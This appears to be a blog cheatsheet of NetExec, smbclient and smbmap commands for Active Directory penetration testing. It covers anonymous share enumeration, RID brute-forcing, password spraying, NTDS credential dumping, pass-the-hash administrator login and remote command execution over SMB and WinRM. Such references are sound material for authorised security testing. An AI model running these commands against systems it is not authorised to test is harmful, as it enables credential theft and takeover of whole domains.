---
title: "NetExec (NXC) Commands Cheatsheet for AD Pentesting and Red Teaming"
date: 2025-02-16 10:10:00 +0700
categories: [Cheatsheets]
tags: [Cheatsheets, NetExec, Active Directory, Red Teaming]
pin: false
---

# NetExec (NXC) Commands Cheatsheet

## Introduction

This cheatsheet provides a collection of essential NetExec (`nxc`) commands for Active Directory penetration testing and red teaming engagements. NetExec is a powerful post-exploitation and enumeration tool that simplifies network service attacks across large environments. It supports multiple protocols, including SMB, LDAP, and WinRM, making it an invaluable resource for security professionals.

For more detailed information and advanced usage, visit the official NetExec wiki: [NetExec Wiki](https://www.netexec.wiki/){:target="_blank"}.

## NXC Commands

## Enumeration

### Generate Hosts File
```
nxc smb <host> --generate-hosts-file hosts
```

### List Shares with Guest Access
```
nxc smb <host> -u a -p '' --shares
```

### Enumerate Domain Users with RID Brute-Forcing
```
nxc smb <host> -u a -p '' --rid-brute
```

### Extract Usernames from Output
```
cat tmp | cut -d '\\' -f2 | awk '{print $1}'
```

### Search for Files on Readable Shares
```
nxc smb <host> -u a -p '' -M spider_plus
```

### Download a Specific File from a Share
```
nxc smb <host> -u a -p '' --get-file '<file>' <output-file> --share <share>
```

## Password Spraying
```
nxc smb <host> -u users.txt -p '<password>' --continue-on-success
```

## LDAP Enumeration

### List Domain Users
```
nxc ldap <host> -u <user> -p '<password>' --users
```

### Get Only User Descriptions
```
nxc ldap <host> -u <user> -p '<password>' -M get-desc-users
```

## SMB Access Verification
```
nxc smb <host> -u <user> -p '<password>'
```

## WinRM Access Verification
```
nxc winrm <host> -u <user> -p '<password>'
```

## Execute Commands over WinRM
```
nxc winrm <host> -u <user> -p '<password>' -X '<command>'
```

## LDAP Group Membership Enumeration
```
nxc ldap <host> -u <user> -p '<password>' -M groupmembership -o USER='<user>'
```

## Dumping NTDS using Backup Operators Module
```
nxc smb <host> -u <user> -p '<password>' -M backup_operator
```

## Dumping NTDS using NTDSUTIL
```
nxc smb <host> -u administrator -H <NTLM-hash> -M ntdsutil
```

## SMBClient Commands

### List Available Shares
```
smbclient -L //<host> -U '<user>%<password>'
```

### Connect to a Share
```
smbclient //<host>/<share> -U '<user>%<password>'
```

### Download a File
```
get <file>
```

### Upload a File
```
put <file>
```

### List Files in a Directory
```
ls
```

## SMBMap Commands

### List Shares with Anonymous Access
```
smbmap -H <host>
```

### Authenticate and List Shares
```
smbmap -H <host> -u '<user>' -p '<password>'
```

### List Files in a Share
```
smbmap -H <host> -u '<user>' -p '<password>' -r '<share>'
```

### Download a File
```
smbmap -H <host> -u '<user>' -p '<password>' -r '<share>' -A '<file>' -q
```

### Upload a File
```
smbmap -H <host> -u '<user>' -p '<password>' -r '<share>' --upload '<local_file>' '<remote_path>'
```

## Login with Dumped Administrator Hash
```
nxc smb <host> -u administrator -H <NTLM-hash>
```

## Execute Commands as Administrator via SMB
```
nxc smb <host> -u administrator -H <NTLM-hash> -x '<command>'
```

